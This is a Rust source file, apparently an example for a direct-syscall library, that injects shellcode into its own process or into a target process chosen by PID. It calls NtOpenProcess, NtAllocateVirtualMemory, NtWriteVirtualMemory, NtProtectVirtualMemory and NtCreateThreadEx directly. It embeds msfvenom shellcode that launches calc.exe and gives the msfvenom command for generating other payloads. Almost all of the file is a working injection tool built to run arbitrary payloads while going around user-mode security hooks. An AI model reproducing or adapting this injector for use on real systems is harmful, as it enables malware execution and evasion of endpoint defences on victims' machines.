use std::ffi::c_void;
use std::ptr::null;
use std::{mem, process};
use std::fmt::format;

use thermite::models::windows::nt_status::NtStatus;     // Only needed for printing the status after each syscalls
use thermite::models::windows::peb_teb::UNICODE_STRING; //

use thermite::{debug, error, info, syscall};

// Don't forget #[repr(C)] !

#[repr(C)]
#[derive(Clone, Debug, Copy)]
pub struct ObjectAttributes {
    length: u32,
    root_directory: isize,
    //Handle,
    object_name: *const UNICODE_STRING,
    attributes: u32,
    security_descriptor: *const c_void,
    //CVoid,
    security_quality_of_service: *const c_void,
}

#[repr(C)]
#[derive(Debug)]
pub struct ClientId {
    pub unique_process: isize,
    pub unique_thread: isize,
}

// Some useful constants
// lifted straight from windows libs
const MEM_RESERVE: u32 = 0x2000;
const MEM_COMMIT: u32 = 0x1000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const GENERIC_EXECUTE: u32 = 0x20000000;
const SYNCHRONIZE: u32 = 0x00100000u32;
const STANDARD_RIGHTS_REQUIRED: u32 = 0x00100000u32;
const PROCESS_ALL_ACCESS: u32 = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF;
// const PROCESS_VM_OPERATION: u32 = 0x0008;   // Required to perform an operation on the address space of a process (see VirtualProtectEx and WriteProcessMemory).
// const PROCESS_VM_READ: u32 = 0x0010;        // Required to read memory in a process using ReadProcessMemory.
// const PROCESS_VM_WRITE: u32 = 0x0020;       // Required to write to memory in a process using WriteProcessMemory.

/// A basic msfvenom shellcode, just spawns calc.exe
///
/// Remember, Stranger Danger,
/// Go get your own shellcode, you can generate it using the following command:
/// ```bash
/// msfvenom -p windows/x64/exec CMD=calc.exe -f rust -v SHELLCODE
/// ```
const POP_CALC: [u8; 276] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];


// Utility function that handles the return value of syscalls and quits if it's not a success
fn print_status(str: &str, x: i32) -> NtStatus {
    let nt_status: NtStatus = unsafe { mem::transmute(x) };
    match nt_status {
        NtStatus::StatusSuccess => {
            info!("{}: {}", str, nt_status);
        }
        _ => {
            error!(nt_status);
            process::exit(nt_status as _);
        }
    }
    return nt_status;
}

/// Read the PID from the program's command line arguments, if a valid PID is read, returns Some(PID)
/// If nothing is found or if the argument cannot be parsed, returns None
fn read_pid() -> Option<u32> {
    let args: Vec<String> = std::env::args().collect::<Vec<String>>();
    if args.len() > 1 {
        let pid: u32 = args[1].parse().ok()?;
        debug!("Target process ID :", pid);
        Some(pid)
    } else {
        None
    }
}

///
/// The function below demonstrate how to execute a shellcode
/// either locally, in our own processes memory or by
/// injecting it in a remote process.
///
/// It takes a PID as argument, if the pid is 0, the shellcode will be executed locally
/// If a PID is provided, it will be injected in the target process
///
fn injector(pid: Option<u32>) {
    // Declaring structures we're going to need
    let mut thread_handle: isize = 0;
    let oa_process: ObjectAttributes = ObjectAttributes {
        length: mem::size_of::<ObjectAttributes>() as _,
        root_directory: 0u32 as _,
        object_name: 0u32 as _,
        attributes: 0,
        security_descriptor: 0u32 as _,
        security_quality_of_service: 0u32 as _,
    };

    // This is "pseudo Handle", a sort of handle constant
    // The value -1 means it's a handle to our own process
    let mut process_handle: isize = -1;

    // If we have a target PID,
    // we go get a real handle to the target process
    // Else we'll  just continue with the pseudo handle
    if let Some(pid) = pid {
        let client_id = ClientId {
            unique_process: pid as _,
            unique_thread: 0 as _,
        };
        let nt_status = syscall!(
            "NtOpenProcess",
            &mut process_handle, //  [out]          PHANDLE            ProcessHandle,
            PROCESS_ALL_ACCESS,  //  [in]           ACCESS_MASK        DesiredAccess,
            &oa_process,         //  [in]           POBJECT_ATTRIBUTES ObjectAttributes,
            &client_id,          //  [in, optional] PCLIENT_ID         ClientId
        );
        print_status("NtOpenProcess", nt_status);
        debug!(process_handle);
    }
    let mut buf_size: usize = POP_CALC.len();
    let mut base_addr: *mut c_void = 0u32 as _;

    let nt_status = syscall!(
        "NtAllocateVirtualMemory",
        process_handle,           // [in]      HANDLE    ProcessHandle,
        &mut base_addr,           // [in, out] PVOID     *BaseAddress,
        0u32,                     // [in]      PULONG ZeroBits,
        &mut buf_size,            // [in, out] PSIZE_T   RegionSize,
        MEM_COMMIT | MEM_RESERVE, // [in]      ULONG     AllocationType,
        PAGE_READWRITE,           // [in]      ULONG     Protect
    );
    print_status("NtAllocateVirtualMemory status:", nt_status);
    info!("[^-^] Allocated {buf_size} bytes of memory at address {base_addr:#x?}");

    // Copy the shellcode to newly allocated memory
    let mut bytes_written: usize = 0;
    let nt_status = syscall!(
        "NtWriteVirtualMemory",
        process_handle,     // [in]              HANDLE    ProcessHandle,
        base_addr,          // [in]              PVOID     *BaseAddress,
        &POP_CALC,          // [in]              PVOID     Buffer,
        buf_size,           // [in]              ULONG     NumberOfBytesToWrite,
        &mut bytes_written, // [out, optional]   PULONG    NumberOfBytesWritten ,
    );
    print_status("NtWriteVirtualMemory", nt_status);
    info!("[^-^] Successfully written {buf_size} bytes in remote memory");

    // Change protection status of allocated memory to READ+EXECUTE
    let mut bytes_written = POP_CALC.len();
    let mut old_protec = PAGE_READWRITE;
    let nt_status = syscall!(
        "NtProtectVirtualMemory",
        process_handle,     // [in]              HANDLE    ProcessHandle,
        &mut base_addr,     // [in, out]         PVOID     *BaseAddress,
        &mut bytes_written, // [in, out]         PULONG    NumberOfBytesToProtect,
        PAGE_EXECUTE_READ,  // [in]              ULONG     NewAccessProtection,
        &mut old_protec,    // [out]             PULONG    OldAccessProtection,
    );
    print_status("NtProtectVirtualMemory", nt_status);

    // Creates a remote thread in target process
    let nt_status = syscall!(
        "NtCreateThreadEx",
        &mut thread_handle,    // [out]            PHANDLE ThreadHandle,
        GENERIC_EXECUTE,       // [in]             ACCESS_MASK DesiredAccess,
        null::<*mut c_void>(), // [in, optional]   POBJECT_ATTRIBUTES ObjectAttributes,
        process_handle,        // [in]             HANDLE ProcessHandle,
        base_addr,             // [in, optional]   PVOID StartRoutine,
        base_addr,             // [in, optional]   PVOID Argument,
        0i32,                  // [in]             ULONG CreateFlags,
        null::<*mut c_void>(), // [in, optional]   ULONG_PTR ZeroBits,
        null::<*mut c_void>(), // [in, optional]   SIZE_T StackSize,
        null::<*mut c_void>(), // [in, optional]   SIZE_T MaximumStackSize,
        null::<*mut c_void>(), // [in, optional]   PVOID AttributeList
    );
    print_status("NtCreateThreadEx", nt_status);

    // Wait for the thread to execute
    // Timeout is a null pointer, so we wait indefinitely
    let nt_status = syscall!(
        "NtWaitForSingleObject",
        thread_handle,          //  [in] HANDLE         Handle,
        0,                      //  [in] BOOLEAN        Alertable,
        null::<*mut c_void>(),  //  [in] PLARGE_INTEGER Timeout
    );
    print_status("NtWaitForSingleObject", nt_status);

    // Close the handle
    let nt_status = syscall!(
        "NtClose",
        thread_handle, // [in] HANDLE Handle
    );
    print_status("NtClose", nt_status);
}

fn main() {
    injector(read_pid());
}
